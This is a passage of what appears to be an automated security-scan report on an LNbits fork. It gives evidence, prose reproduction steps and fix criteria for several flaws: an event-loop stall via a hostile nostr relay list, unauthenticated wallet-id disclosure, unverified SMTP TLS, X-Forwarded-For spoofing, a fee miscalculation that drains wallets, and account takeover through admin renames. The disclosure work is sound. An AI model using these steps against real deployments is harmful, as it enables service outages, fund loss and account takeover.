4. [lnbits/core/services/notifications.py:377–389](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L377-L389)
   send_chat_payment_notification enqueues a user notification for every payment on the user's wallets whose amount meets the user's own thresholds (default 0), so each payment the user makes or receives — including free internal self-payments — triggers one nostr delivery.
5. [lnbits/core/views/auth\_api.py:589–602](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L589-L602)
   Any authenticated account replaces account.extra wholesale through PATCH /api/v1/auth, setting its own nostr_identifier (and 0-sat thresholds) with no validation.
6. [lnbits/core/models/users.py:24–30](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/users.py#L24-L30)
   UserNotifications.nostr_identifier is an unvalidated `str | None`; incoming/outgoing thresholds default to 0.
7. [lnbits/core/services/payments.py:863–869](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L863-L869)
   An internal (wallet-to-wallet) payment notifies the sender via send_payment_notification_in_background and enqueues the receiver's invoice for the core listener (dispatch_payment_notification), so one zero-fee self-payment between the attacker's own wallets yields two notification deliveries.
8. [lnbits/server.py:57–79](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/server.py#L57-L79)
   LNbits runs as a single uvicorn process (one mp.Process, no workers; Dockerfile CMD likewise), so blocking the event loop stalls every request, websocket, invoice listener and scheduler task in the deployment.

## Impact
Full stall of the LNbits process — all API requests, websockets, invoice listeners and payment processing — for an attacker-controlled duration; repeatable at no cost. No confidentiality or integrity impact.

## Reproduction steps
1. A registered user (registration open by default) hosts a nostr.json listing thousands of unreachable relays (black-holed IPs or hostnames with a non-answering nameserver), sets `me@their-domain` as nostr_identifier via PATCH /api/v1/auth, and pays themselves internally (free, thresholds default 0). The single uvicorn process's event loop then blocks in sequential create_connection calls for a duration the attacker's list length sets; repeatable per payment. Requires the operator to have enabled Nostr notifications with a signing key (admin feature, off by default) — AT:P. Dependency assumption: websocket-client 1.9.2 create_connection is synchronous with blocking getaddrinfo and a per-socket 2 s timeout.

## Recommended fix
1. Blocking websocket-client calls (create_connection, send, close) run on the asyncio event loop. Fix criteria: Relay delivery runs in a worker thread or via an async websocket client with explicit DNS/connect/handshake/close timeouts; a stalled relay must not delay unrelated request handling.
2. The number of relays taken from the remote nostr.json is unbounded. Fix criteria: Cap the relays attempted per notification (a small fixed number) and bound total delivery time per notification, so a hostile nostr.json cannot multiply the cost of one notification.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Resource Exhaustion
**CWE:** [CWE-400](https://cwe.mitre.org/data/definitions/400.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257530

---

# Unauthenticated /manifest/{usr}.webmanifest discloses any user's wallet ids and names

## Details
GET /manifest/{usr}.webmanifest (lnbits/core/views/generic.py:100-178) is registered on generic_router with no authentication dependency. It calls get_user(usr) with the caller-supplied path value; get_user_from_account (core/crud/users.py:262-291) loads every non-deleted wallet of that account (including mirror wallets of wallets shared into it), and the route serialises them: `start_url` carries the first wallet id and `shortcuts` lists the name and id of every wallet. Only the existence of an activated account with that id is checked.

The project's own control for usr-keyed access is _check_account_exists (lnbits/decorators.py:330-339): a bare `usr` is honoured only when the `user-id-only` auth method is in auth_allowed_methods (default is `username-password` only, settings.py:944-948), and never for admin accounts (decorators.py:332-335). The manifest route sits outside that control, so in the default configuration it is the only core route that hands per-user data to anyone who merely holds a user id, and it does so even for admins, whose id-only access the project explicitly forbids. The UI treats the user id as sensitive-but-not-a-credential in this configuration (account.vue masks it as a password field), yet it is written into shareable `/wallet?usr=...&wal=...` links (lnbits-wallet-extra.js:11, users.js:358), /uuidv4/{hex} and /lnurlwallet redirects, so it reaches browser histories, referrers and recipients of such links.

Wallet ids and names are otherwise shown only to the owner's session, admins, or an admin-key holder (GET /api/v1/wallet returns `id` only for the admin key, wallet_api.py:75-83; an invoice key does not even learn its own wallet's id). Wallet names are free text chosen by the user and commonly describe purpose or counterparties. Note the `<link rel="manifest">` in base.html:44-45 is guarded by a `web_manifest` context variable that no Python code sets, so the route is live but unlinked; this does not affect reachability. The wallet auto-creation at users.py:269-271 when an account has zero wallets is the same normalisation the owner's own next login performs via check_user_exists, so it is not an attacker gain.

## Evidence
1. [lnbits/core/views/generic.py:100–178](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/generic.py#L100-L178)
   Route declared with no Depends() auth; get_user(usr) on the caller-supplied path parameter, then start_url embeds user.wallets[0].id and shortcuts emits name and id for every wallet of the account. No session, key, ownership or auth-method check.
2. [lnbits/decorators.py:330–339](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L330-L339)
   The shipped control the manifest route bypasses: usr-keyed access is honoured only when user-id-only auth is allowed (default off) and is refused for admins; otherwise 401. Every other usr-accepting page route goes through this.
3. [lnbits/core/crud/users.py:262–291](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/users.py#L262-L291)
   get_user_from_account loads all non-deleted wallets of the account (get_wallets by user id) into user.wallets, which the route serialises. The auto-create at 269-271 when there are no wallets is identical to what the owner's own login triggers, so it is a side effect without attacker gain.
4. [lnbits/settings.py:944–948](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L944-L948)
   auth_allowed_methods defaults to username-password only, so by default the user id is an identifier rather than a login credential and this route is the only core path returning per-user data for it.

## Impact
Discloses another user's wallet inventory (ids and free-text names, including mirrored shared wallets) across the user-to-user isolation boundary; no keys, balances or payments are exposed, so confidentiality is LOW. The possible wallet auto-creation is the same normalisation the owner's next login performs and yields the attacker nothing, so integrity is NONE; no availability effect.

## Reproduction steps
1. An unauthenticated network client that knows a target's uuid4-hex user id requests /manifest/<usr>.webmanifest and receives every wallet id and name of that account. No credentials or interaction; the one precondition is possession of the user id, which is not guessable but is embedded in owner-shareable /wallet?usr= links, redirects and admin pages, hence AT:P.

## Recommended fix
A per-user resource is served by user id alone, outside the project's usr-access gate (user-id-only method allowed, non-admin) and without verifying the caller is that user. Fix criteria: The manifest route authenticates the caller like other user pages (session token, or usr only when the user-id-only method is allowed and the account is not an admin, i.e. via check_user_exists) and returns 401/404 otherwise; an unauthenticated request for a valid user id must reveal no wallet names or ids.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Missing authorization
**CWE:** [CWE-862](https://cwe.mitre.org/data/definitions/862.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257527

---

# SMTP notifications use STARTTLS without certificate verification, exposing SMTP credentials to interception

## Details
`send_email` opens a plaintext SMTP connection to the configured mail server, upgrades it with `smtp_server.starttls()` and then authenticates with the operator's SMTP username and password. No `ssl.SSLContext` is passed. In CPython, `smtplib.SMTP.starttls()` without a context falls back to `ssl._create_stdlib_context()`, an *unverified* context (`verify_mode=CERT_NONE`, `check_hostname=False`). The resulting TLS session therefore protects against passive sniffing only; any machine-in-the-middle between LNbits and the mail provider can terminate TLS with a self-signed certificate, read the `AUTH` exchange (LOGIN/PLAIN — the password is base64 in the clear inside the tunnel), capture the notification bodies (payment amounts, wallet names and ids, server status with balances), and relay or alter them.

The credentials belong to the operator's mail account (default server is a third-party provider, so the path crosses the public Internet or at least the hosting network). With them an attacker can send mail as the operator and read the mailbox if the provider uses the same password for IMAP. The threat model lists operator service credentials among the protected secrets.

Note the code calls `starttls()` unconditionally, so STARTTLS stripping fails (an `SMTPNotSupportedError` is raised if the server does not advertise it); the weakness is specifically the missing certificate/hostname validation. Root cause: TLS used without peer authentication for a credentialed connection.

## Evidence
1. [lnbits/core/services/notifications.py:232–237](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L232-L237)
   smtplib.SMTP(server, port) connects in plaintext, then starttls() is called with no ssl context, followed by login(username, password) and sendmail. Assumption about the standard library: in CPython 3.10-3.12 (pyproject.toml requires-python '>=3.10,<3.13'; Dockerfile FROM python:3.12-slim-bookworm) SMTP.starttls(context=None) builds the context with ssl._create_stdlib_context(), i.e. verify_mode=CERT_NONE and check_hostname=False, so the server certificate and hostname are never validated and any peer completing the handshake receives the AUTH exchange. The project itself uses ssl.create_default_context() for Electrum (lnbits/utils/electrum.py:372) and CLNRest (lnbits/wallets/clnrest.py:585), so unverified TLS is not a project-wide design choice.
2. [lnbits/core/services/notifications.py:186–201](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L186-L201)
   The admin-configured SMTP username/password and the notification text travel over this unauthenticated TLS session on every admin or user notification and on /admin/api/v1/testemail.
3. [lnbits/settings.py:508–513](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L508-L513)
   Defaults point at a remote provider (smtp.protonmail.ch:587), i.e. traffic crosses the Internet where an on-path attacker can present any certificate.

## Impact
Discloses the operator's SMTP password and notification contents (balances, wallet ids); messages can be altered in transit. Confidentiality LOW (one configured secret and notification data, not wallet keys), integrity LOW. Subsequent-system impact: The captured SMTP credential grants use of the operator's mail account at the provider (send as operator; possibly read mail), which is outside LNbits' boundary.

## Reproduction steps
1. An on-path attacker (compromised router, hostile network between the LNbits host and smtp provider) intercepts port 587, completes STARTTLS with any certificate, and records the AUTH exchange and message body the next time a notification or test email is sent. Requires email notifications to be enabled and a MITM position; no interaction, no privileges on LNbits.

## Recommended fix
starttls() is invoked without an SSLContext, so the default unverified context is used and the SMTP server identity is never checked. Fix criteria: Pass a verifying context (ssl.create_default_context(), hostname checking on) to starttls(), or use SMTP_SSL with the same context; a connection to a server presenting an untrusted or mismatched certificate must fail before credentials are sent.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Improper Certificate Validation
**CWE:** [CWE-295](https://cwe.mitre.org/data/definitions/295.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** LOW
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257526

---

# Default forwarded_allow_ips='*' lets any direct client spoof its IP past the IP blocklist and audit log

## Details
LNbits starts uvicorn with `forwarded_allow_ips` from settings, whose default is `"*"` (settings.py:1170); the Docker image and the boltzclient/sparkl2 entrypoints additionally hard-code `--forwarded-allow-ips='*'` on the command line, and the nix module and lnbits.sh pass nothing so the default applies. uvicorn 0.40.0's documented contract for `*` is to trust proxy headers from every peer: `ProxyHeadersMiddleware` rewrites `scope['client']` from `X-Forwarded-For` and `scope['scheme']` from `X-Forwarded-Proto` (assumption about uvicorn 0.40.0: with `*` the left-most X-Forwarded-For entry becomes the client address).

That is only sound when every TCP peer is a trusted reverse proxy, and nothing in the project enforces or documents that fence: `.env.example:80-83` describes the variable as "allow https behind a proxy" but never tells operators to narrow it; the documented Docker install (`docs/guide/installation.md:308`) publishes port 5000 directly; the "HTTPS without a reverse proxy" section runs uvicorn directly on 0.0.0.0; and the documented nginx config (`proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for`) and Apache mod_proxy config append the real address to any client-supplied X-Forwarded-For rather than replacing it, so under the always-trust left-most semantics the attacker's injected entry still wins behind those proxies (Caddy >= 2.5 strips untrusted X-Forwarded-* and is not affected).

Any anonymous client therefore sends `X-Forwarded-For: 203.0.113.9` and LNbits treats that as `request.client.host`. Consumers that make decisions on it:
- `block_allow_ip_middleware` (`middleware.py:219-231`): the admin-maintained `lnbits_blocked_ips` denylist (SecuritySettings, exposed in the admin Security tab) is checked against the rewritten host, so a blocked client bypasses the block by naming any other address. The spoof acts around the shipped control, pre-auth.
- Audit logging (`middleware.py:145-149`) records the forged address when `lnbits_audit_log_ip_address` is on, destroying attribution.
- `X-Forwarded-Proto` drives `request.url.scheme`/`request.base_url`, reflected into the SSO `redirect_uri` (`auth_api.py:420`) and the WASM frame CSP origin (`wasm_ext/routes/security.py:39`); low impact on its own.
- The slowapi limiter key (`app.py:482`, `get_remote_address`) is the same value; rate-limit evasion is noted as the same root cause but is not the basis of the rating.

Root cause: a trust-every-peer proxy-header default (and a hard-coded wildcard in the shipped images) applied regardless of whether a trusted proxy exists in front of the process, so IP-based security decisions are made on a client-authored header.

## Evidence
1. [lnbits/settings.py:1170](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L1170)
   forwarded_allow_ips defaults to '*' for every start mode, not only when a proxy is configured.
2. [lnbits/server.py:57–69](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/server.py#L57-L69)
   The value is handed to uvicorn.Config(forwarded_allow_ips=...), which installs ProxyHeadersMiddleware trusting X-Forwarded-For / X-Forwarded-Proto from every peer when '*' is used (behaviour of the pinned uvicorn 0.40.0, stated as an assumption).
3. [Dockerfile:46](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/Dockerfile#L46)
   The published image binds 0.0.0.0 and passes --forwarded-allow-ips='*' on the CMD line; because the CLI flag wins over settings, an operator cannot fence it through FORWARDED_ALLOW_IPS in .env. docker/boltzclient/entrypoint.sh:26 and docker/sparkl2/entrypoint.sh:25 do the same. The nix module (nix/modules/lnbits-service.nix:114) and lnbits.sh pass no flag, so the '*' default applies there too.
4. [lnbits/middleware.py:216–232](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/middleware.py#L216-L232)
   The IP block/allow middleware decides on request.client.host, which ProxyHeadersMiddleware has already replaced with the attacker-supplied X-Forwarded-For value.
5. [lnbits/middleware.py:145–148](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/middleware.py#L145-L148)
   When lnbits_audit_log_ip_address is enabled, audit entries record request.client.host as the actor's IP, so the forensic record is attacker-chosen.
6. [lnbits/app.py:479–486](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/app.py#L479-L486)
   The slowapi limiter is keyed on get_remote_address (same spoofable value); noted for completeness, not the basis of the rating.

## Impact
The operator's IP blocklist is bypassed and audit source addresses are falsified, a limited integrity loss on access-control and forensic state. The spoof itself discloses nothing and does not affect availability (rate-limit evasion is volumetric and not rated).

## Reproduction steps
1. Any unauthenticated network client adds an X-Forwarded-For header to its request; no credentials or user interaction are needed. The target must have an IP denylist (or IP audit logging) in use and be deployed per the project's defaults/docs (direct Docker publish, direct uvicorn, or the documented nginx/Apache configs that append rather than overwrite X-Forwarded-For); a proxy that strips client-supplied X-Forwarded-* defeats it, so attack requirements are PRESENT. The left-most-entry behaviour of uvicorn 0.40.0 under '*' is an assumption not verifiable in the checkout.

## Recommended fix
1. Forwarded headers are trusted from every peer by default, and the shipped Docker/entrypoint command lines hard-code the wildcard so operators cannot narrow it through configuration. Fix criteria: Default forwarded_allow_ips to loopback (or no proxy), trusting X-Forwarded-* only from proxies the operator lists; make the Docker image and sidecar entrypoints take the value from an environment variable instead of a hard-coded '*'; document that direct exposure must not trust forwarded headers. A direct client sending X-Forwarded-For or X-Forwarded-Proto must not change request.client.host or request.url.scheme.
2. IP block/allow and audit decisions read request.client.host without regard to whether a trusted proxy produced it. Fix criteria: The IP block/allow middleware and audit logger must base their decisions on an address that is the TCP peer unless the peer is a configured trusted proxy; a request from a blocked TCP peer is rejected regardless of any forwarded header it carries.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Client IP spoofing
**CWE:** [CWE-348](https://cwe.mitre.org/data/definitions/348.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257420

---

# CoreLightningRest get_payment_status computes fee as -(sent+amount), over-debiting payer wallets

## Details
CoreLightningRestWallet.get_payment_status (corelightningrest.py:270-280) converts c-lightning-REST's `"<n>msat"` strings and computes the routing fee as

    fee_msat = -int(pay["amount_sent_msat"][:-4]) - int(pay["amount_msat"][:-4])

That is -(sent) - (amount), not -(sent - amount). For a real node response (`amount_sent_msat: "22000msat"`, `amount_msat: "21000msat"`) it yields -43000 msat instead of -1000. The repository's own fixture masks the error by using a negative `"amount_sent_msat": "-22000msat"` (tests/wallets/fixtures/json/fixtures_rest.json:2532), a value a node never produces. The sibling implementation in corelightning.py:338-340 (`-int(sent - amount)`) and the pay_invoice path in the same file (:209, `msatoshi_sent - msatoshi`) are correct, showing the intended semantics.

The core trusts the magnitude: update_payment_success_status (core/services/payments.py:1050-1053) sets `payment.fee = -(abs(status.fee_msat) + service_fee)` and the balances view subtracts ABS(fee), so the payer's wallet is debited amount + (sent + amount) ≈ 3× the invoice amount instead of amount + routing fee. The surplus is not credited to anyone (the service-fee wallet only receives the service fee), so user funds silently vanish from the ledger while the node spent only amount+fee.

Reachability: the poll path is used whenever pay_invoice does not settle synchronously. On current Core Lightning releases the `/v1/pay` response no longer carries the deprecated `msatoshi_sent`/`msatoshi` keys that pay_invoice reads (:209), so a KeyError turns every payment into 'pending' (:232-236) and settlement always happens through get_payment_status. Even on older nodes, any payment that takes longer than lnbits_funding_source_pay_invoice_wait_seconds (default 5 s) is settled this way; a payee can force that by holding the HTLC a few seconds before settling. The poll is triggered by check_pending_payments (every 30 min), by the wallet's own list refresh, or by anyone calling the public GET /api/v1/payments/{payment_hash}.

If the node instead returns integer msat values (CLN with the msat-suffix strings removed), `[:-4]` raises TypeError and the payment stays pending forever, which locks the pending amount but does not over-debit.

Impact is on ledger integrity for every user paying through this backend: deterministic loss of roughly twice the paid amount per payment, independent of any attacker, and exploitable as griefing by a payee who delays settlement.

## Evidence
1. [lnbits/wallets/corelightningrest.py:275–277](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/corelightningrest.py#L275-L277)
   fee_msat = -int(amount_sent_msat[:-4]) - int(amount_msat[:-4]) is -(sent) - (amount), not -(sent - amount): for the node's honest sent=22000msat, amount=21000msat it yields -43000 instead of -1000. The sibling corelightning.py:338-340 uses -int(sent - amount) and pay_invoice in this file (:209) uses msatoshi_sent - msatoshi, both correct. The repo fixture (tests/wallets/fixtures/json/fixtures_rest.json:2532) only passes because it feeds an impossible negative "-22000msat".
2. [lnbits/core/services/payments.py:1049–1054](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1049-L1054)
   update_payment_success_status sets payment.fee = -(abs(status.fee_msat or 0) + abs(service_fee_msat)) and persists it via update_payment; there is no comparison against the fee reserve or the invoice amount, so the inflated magnitude (about 2x the payment amount) becomes the recorded fee.
3. [lnbits/core/migrations.py:544–556](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/migrations.py#L544-L556)
   The balances view computes SUM(amount - ABS(fee)) over successful/pending outgoing payments, so the inflated fee is subtracted from the payer's wallet balance: a 21 sat payment debits 21 + 43 = 64 sat instead of 22 sat.
4. [lnbits/core/services/payments.py:422–438](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L422-L438)
   update_pending_payment -> check_payment_status (:711-731) calls funding_source.get_payment_status for every still-pending outgoing payment and, on success, update_payment_success_status. It is reached by the periodic check_pending_payments task (:441-471, scheduled in app.py:591-594), by GET /api/v1/payments/paginated?recheck_pending=true (payment_api.py:224) and by the unauthenticated GET /api/v1/payments/{payment_hash} (payment_api.py:429-454), which the payee can call with the hash of their own invoice.
5. [lnbits/core/services/payments.py:923–934](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L923-L934)
   pay_invoice waits at most lnbits_funding_source_pay_invoice_wait_seconds (default 5, settings.py:820) on the funding-source call via asyncio.wait_for, which cancels the task and returns the payment as pending on timeout; a payee that holds the HTLC longer than that forces settlement through the get_payment_status poll path.
6. [lnbits/wallets/corelightningrest.py:199–236](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/corelightningrest.py#L199-L236)
   pay_invoice reads the legacy msatoshi_sent/msatoshi keys (:209); when the node's /v1/pay response omits them a KeyError returns PaymentResponse(error_message=...) with ok=None, i.e. pending (:232-236), so on such nodes every payment settles through the miscomputing poll path without any payee action.

## Impact
Integrity of the apipayments ledger for the paying wallet: the recorded fee is about 2x the payment amount instead of the routing fee, so the victim's balance drops by roughly 3x the invoice amount, can go negative, and the surplus is credited to no wallet (only the real service fee goes to the service-fee wallet) while the node spent only amount + routing fee. No confidentiality impact; availability impact is confined to the victim's misaccounted funds.

## Reproduction steps
1. Deployment uses the shipped, default-allowed CoreLightningRestWallet funding source (settings.py:1272). Assumed dependency behaviour (not verifiable in this checkout): c-lightning-REST /v1/pay/listPays returns amount_sent_msat/amount_msat as positive "<n>msat" strings, which is exactly the format the project's own fixture encodes and the code's comment 'cut off msat' expects; if the node returned bare integers the [:-4] slice would raise TypeError and the payment would merely stay pending. Under that assumption no attacker is strictly needed: any outgoing payment that is settled via get_payment_status is over-debited. As an attack, a remote payee (any Lightning node operator, no LNbits privileges) issues an invoice, the victim user pays it, the payee delays HTLC settlement beyond the 5 s synchronous window (or the node simply lacks the legacy msatoshi keys so pay_invoice already returns pending), then settles; the payee can immediately drive the poll with the unauthenticated GET /api/v1/payments/{payment_hash}, or wait for the periodic check_pending_payments task or the victim's wallet refresh.

## Recommended fix
1. get_payment_status derives the routing fee as -(amount_sent_msat) - amount_msat instead of amount_sent_msat - amount_msat, and the unit test fixture encodes a physically impossible negative amount_sent_msat that hides the sign error. Fix criteria: get_payment_status must report fee_msat equal to amount_sent_msat - amount_msat (a non-negative routing fee) for both the "<n>msat" string and integer msat encodings of the node response; the fixture must use realistic positive node values and expect fee == sent - amount; a payment completed via the poll path must debit exactly amount + routing fee + service fee.
2. update_payment_success_status persists whatever fee magnitude a funding source reports, with no bound relative to the fee reserve the payment was authorised with. Fix criteria: The core should reject or flag (not silently persist) a reported routing fee that exceeds the fee reserve the payment was created with, so a single backend parsing error cannot over-debit a wallet beyond the authorised amount.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Incorrect calculation
**CWE:** [CWE-682](https://cwe.mitre.org/data/definitions/682.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257416

---

# Admin user-update rewrites login identity of any non-super account, enabling full takeover

## Details
Ledger item x-auth-05. `PUT /users/api/v1/user/{user_id}` (check_admin) rebuilds the target Account from the client body and lets any admin — not only the super user — overwrite the three attributes LNbits resolves a principal by at authentication time: `username` (JWT `sub`, decorators.py:559-560), `pubkey` (Nostr login, auth_api.py:170) and `email` (SSO login, auth_api.py:667). The only target restriction is `user_id == settings.super_user` (user_api.py:135-139); other admins and all ordinary users are valid targets. `update_user_account` (services/users.py:110-140) only checks the new values are not held by another active account; it does not bump the target's `two_factor.revision` or otherwise invalidate sessions. Two takeover paths follow.

(a) Username swap, default auth configuration. Admin A controls some account U with username "x" and a password — their own, or a throwaway created with POST /users/api/v1/user (new accounts have `two_factor` empty, so revision ""). A logs in as U, obtaining token T with `sub="x"`, `mfa_revision=""` (auth_api.py:884-885, two_factor.py:253-262). A renames U away from "x" (PUT /users/api/v1/user/{U} or PATCH /api/v1/auth), then PUTs victim V with `username="x"`; the uniqueness check passes because the name is free. From then on `_get_account_from_jwt_payload` resolves T to V on every `check_account_exists`/`check_user_exists` route immediately and on cached `check_account_id_exists` routes once the 10-minute entry expires. `check_two_factor_session(V.id, T)` passes when V's `two_factor.revision` equals T's `mfa_revision` — true for every account that never changed its password (update_account_password randomises it) and never enrolled/disabled 2FA; such victims are bounded out, all others are not.

(b) Pubkey/email rewrite, when `nostr-auth-nip98` or an SSO method is enabled. A sets V.pubkey to A's own key (or V.email to an address asserted by an IdP A controls) and logs in via /api/v1/auth/nostr or the SSO callback, receiving a first-class session for V with a fresh `auth_time`. 2FA-enrolled victims still get a challenge; everyone else does not.

What the admin gains over what the project concedes. Admins already read every wallet's admin/invoice key via GET /users/api/v1/user/{id} and may impersonate non-admin users, so the victim's funds and wallet data are not the new reach. The project explicitly refuses admins three things this path delivers: a session as another admin (impersonate: auth_api.py:213-217 "You cannot impersonate another admin user"), login credentials for another account (reset_password is `check_super_user`, user_api.py:191-194), and security operations under a borrowed identity (impersonated sessions are stamped `impersonated_by` and blocked from every `security_operation` path, two_factor.py:338-341). The session obtained here is unmarked: it can change the victim's pubkey (PUT /api/v1/auth/pubkey, needs only a recent auth_time, which (b) or a scripted (a) supplies), enrol or alter 2FA on the victim, set a password on password-less (nostr/SSO) accounts, enable extensions and act under the victim's identity — including another admin's — for audit purposes. The verified finding `admin-settings-put-missing-super-user-check-funding-sso-admin-fields` covers admin→super-user via self-configured SSO; this is a separate sink needing no settings change and, via (a), no non-default auth method. `session-jwt-resolved-by-mutable-username` (decorators.py:559) is the related resolution weakness; this record adds the admin-controlled rename of another account as the source.

Remediation belongs on both sides: identity-bearing attributes of other accounts should be changeable only by the super user or with the target's own re-authentication, and changing them must invalidate the account's outstanding sessions (bump `two_factor.revision`) and tokens should resolve by the immutable account id.

## Evidence
1. [lnbits/core/views/user\_api.py:128–160](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/user_api.py#L128-L160)
   PUT /users/api/v1/user/{user_id} (check_admin) rebuilds the target Account from client-supplied username, email, pubkey and external_id and persists it via update_user_account. The only target restriction is user_id == settings.super_user (lines 135-139); other admins and all users are writable, whereas the sibling reset_password route (191-194) is super-user only and impersonation refuses admin targets.
2. [lnbits/core/services/users.py:110–139](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/users.py#L110-L139)
   update_user_account only checks that the new username/email/pubkey are not held by another *active* account and then writes them; no session re-binding, revision bump or notification of the victim.
3. [lnbits/decorators.py:559–569](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L559-L569)
   Session tokens are resolved by payload.sub (username) first, so renaming a victim onto the username carried by the attacker's own token makes that token authenticate as the victim.
4. [lnbits/core/views/auth\_api.py:855–885](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L855-L885)
   _login_response puts account.username into sub for every interactive login, so the attacker's token carries a username they can later vacate.
